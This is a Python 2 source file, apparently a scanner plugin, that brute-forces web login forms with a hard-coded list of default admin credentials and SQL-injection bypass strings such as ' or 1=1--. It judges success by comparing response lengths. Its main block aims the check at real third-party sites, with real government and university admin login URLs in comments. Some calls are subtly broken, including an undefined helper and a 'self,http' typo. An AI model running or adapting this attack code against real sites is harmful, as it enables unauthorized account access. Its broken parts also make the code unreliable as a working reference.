#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import httplib2
import urllib2
import urllib
import random
import json
import sys
import os

#from net import HTTP
sys_path = lambda relativePath: "%s/%s"%(os.getcwd(), relativePath)

class simhash:
    
    #构造函数
    def __init__(self, tokens='', hashbits=32):        
        self.hashbits = hashbits
        self.hash = self.simhash(tokens);
    
    #toString函数    
    def __str__(self):
        return str(self.hash)
    
    #生成simhash值    
    def simhash(self, tokens):
        v = [0] * self.hashbits
        for t in [self._string_hash(x) for x in tokens]: #t为token的普通hash值  
            #print "==="
            for i in range(self.hashbits):
                bitmask = 1 << i
                if t & bitmask :
                    v[i] += 1 #查看当前bit位是否为1,是的话将该位+1
                else:
                    v[i] -= 1 #否则的话,该位-1
        fingerprint = 0
        for i in range(self.hashbits):
            if v[i] >= 0:
                fingerprint += 1 << i
        return fingerprint #整个文档的fingerprint为最终各个位>=0的和
    
    #求海明距离
    def hamming_distance(self, other):
        x = (self.hash ^ other.hash) & ((1 << self.hashbits) - 1)
        tot = 0;
        while x :
            tot += 1
            x &= x - 1
        return tot
    
    #求相似度
    def similarity (self, other):
        a = float(self.hash)
        b = float(other.hash)
        if a > b : return b / a
        else: return a / b
    
    #针对source生成hash值   (一个可变长度版本的Python的内置散列)
    def _string_hash(self, source):        
        if source == "":
            return 0
        else:
            x = ord(source[0]) << 7
            m = 1000003
            mask = 2 ** self.hashbits - 1
            for c in source:
                x = ((x * m) ^ ord(c)) & mask
            x ^= len(source)
            if x == -1:
                x = -2
            return x
#end class

class FormWeakPasswordCheck(object):
    
    def __init__(self, http,user_id):
        self.user_id=user_id
        if int(user_id) == -1:
            self.weak_dict = []
            self.weak_dict.append({"admin":"123abc"})
            self.weak_dict.append({"admin":"aaa111"})
            self.weak_dict.append({"admin":"q1w2e3"})
            self.weak_dict.append({"admin":"manage"})
            self.weak_dict.append({"manage":"aaa111"})
            self.weak_dict.append({"test":"test"})
            self.weak_dict.append({"admin":"password"})
            self.weak_dict.append({"Admin":"admin"})
            self.weak_dict.append({"admin":"xyz123"})
            self.weak_dict.append({"admin":"admin123"})
            self.weak_dict.append({"cmseasy":"cmseasy"})
        else:
            self.weak_dict = self.load_dict()
        #end if
        self.http = http
        self.user_id=user_id
    #end def
    
    def load_dict(self):
        d = []
        filepath = sys_path("/www/dic/form_")
        shelldic=open(filepath+self.user_id+".dic","r")
        line=shelldic.readline().strip()
        while line!="":
            username=line.split(":")[0]
            password=line.split(":")[1]
            d.append({username:password})
            line=shelldic.readline().strip()
        if line!="":
            d.append({"' or '1'='1":"'or '1'='1"})
            d.append({"' or 1=1--":"123"})
            d.append({"' or '1'='1":"'or 1=1--"})
        return d
    #end def
    
    def check_js(self, data):
        import re
        lines = data.split("\r\n")
        to_del = []
        for l in lines:
            if l.strip() == "":
                to_del.append(l)
            #end if
        #end for
        
        for d in to_del:
            lines.remove(d)
        #end for
        
        if len(lines) == 1:
            p = re.compile(r"<script>.*alert")
            
            if p.findall(lines[0].lower()):
                return True
            else:
                return False
            #end if
        #end if
        
        return False
    #end def
    
    def check(self, url, action_info):

        form_vars = json.read(action_info)
        
        text_var_num = 0
        pass_var_num = 0
        
        text_var_name = ""
        pass_var_name = ""
        
        parms = {}

        for v in form_vars:
            t = v.get("type")
            n = v.get("name")
            z = v.get("value")
            
            parms.setdefault(n, z)
            
            if t and t == "text":
                text_var_num = text_var_num + 1  
                text_var_name = n
            elif t and t == "password":
                pass_var_num = pass_var_num + 1
                pass_var_name = n
            #end if
        #end for
        
        try:
        
            if text_var_num == 1 and pass_var_num == 1:
                #cookies = urllib2.HTTPCookieProcessor()
                #opener = urllib2.build_opener(cookies)
                #urllib2.install_opener(opener)
                
                has_checked_username = {}

                for w in self.weak_dict:

                    for k in w:
                        try:
 
                            if has_checked_username.get(k) != None:
                                parms[text_var_name] = k
                                parms[pass_var_name] = w.get(k)
 
                                #resp, tmp_data = self.http.request(url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                resp, tmp_data = yx_httplib2_request(self.http,url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                postdata=urllib.urlencode(parms)
                                #print urllib.urlencode(parms)

                                #print error_data
                                #print (has_checked_username.get(k) - len(tmp_data))
                                if abs(has_checked_username.get(k) - len(tmp_data)) > 10: #tmp_data != error_data:

                                    parms[text_var_name] = k
                                    parms[pass_var_name] = "".join([random.choice("0123456789abcdefghjijklmnopqrstuvwxyz") for i in range(0,10)]) 
               
                                    #resp, error_data = self.http.request(url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                    resp, error_data = yx_httplib2_request(self,http,url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                    
                                    if self.check_js(error_data) == False:
                                        #print (has_checked_username.get(k) - len(tmp_data))
                                        if abs(has_checked_username.get(k) - len(error_data)) < 10:
                                            return k, w.get(k),resp,postdata
                                    #end if
                                #end if
                                
                                #if tmp_data != has_checked_username.get(k):
                                #    return k, w.get(k)
                                #end if
                            else:
                                parms[text_var_name] = k
                                parms[pass_var_name] = "".join([random.choice("0123456789abcdefghjijklmnopqrstuvwxyz") for i in range(0,10)]) 

                                #resp, error_data = self.http.request(url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                resp, error_data = yx_httplib2_request(self.http,url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})


                                has_checked_username.setdefault(k, len(error_data))
                                
                                parms[pass_var_name] = w.get(k)
    
                                #tmp_data = urllib2.urlopen(url, urllib.urlencode(parms)).read()
                                #resp, tmp_data = self.http.request(url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                resp, tmp_data = yx_httplib2_request(self.http,url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                postdata=urllib.urlencode(parms)
    
                                #print urllib.urlencode(parms)

                                #print (has_checked_username.get(k) - len(tmp_data))
                                if abs(has_checked_username.get(k) - len(tmp_data)) > 10: #tmp_data != error_data:
                              
                                    parms[text_var_name] = k
                                    parms[pass_var_name] = "".join([random.choice("0123456789abcdefghjijklmnopqrstuvwxyz") for i in range(0,10)]) 
               
                                    #error_data = urllib2.urlopen(url, urllib.urlencode(parms)).read()
                                    #resp, error_data = self.http.request(url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                    resp, error_data = yx_httplib2_request(self.http,url, "POST", urllib.urlencode(parms), {"Content-Type":"application/x-www-form-urlencoded"})
                                    
                                    if self.check_js(error_data) == False:
                                        #print (has_checked_username.get(k) - len(tmp_data))
                                        if abs(has_checked_username.get(k) - len(error_data)) < 10:
                                            return k, w.get(k),resp,postdata
                                    #end if
                                #end if
                            #end if
                        except Exception,e:
                            print e
                    #end for
                #end for
            #end if 
        except Exception,e:
            print e
        #end try
        
        return None, None,None,None
    #end def
#end class
if __name__ == '__main__':
    """
    a = "".join([random.choice("0123456789abcdefghjijklmnopqrstuvwxyz") for i in range(0,10024)]) 
    print a
    hash1 = simhash(a)
    sys.exit(0)
    """
    a = """[{"type":"text","name":"yhm","value":""},{"type":"password","name":"m","value":""},{"type":"hidden","name":"fz_id","value":"cz11000"}]"""
    import httplib2
    c = FormWeakPasswordCheck(httplib2.Http(), -1)
    
    #www.tjcac.gov.cn/admin/Admin_login.asp
    #print c.check("http://kysb.hpu.edu.cn/kygl/Admin_Login.asp", a)
    u,p = c.check("http://www.zgsyxlw.com/tupian/upfile.php", a)
    
    if u is None or p is None:
        print "Not found"
    else:
        print "username:",
        print u
        print "password:",
        print p
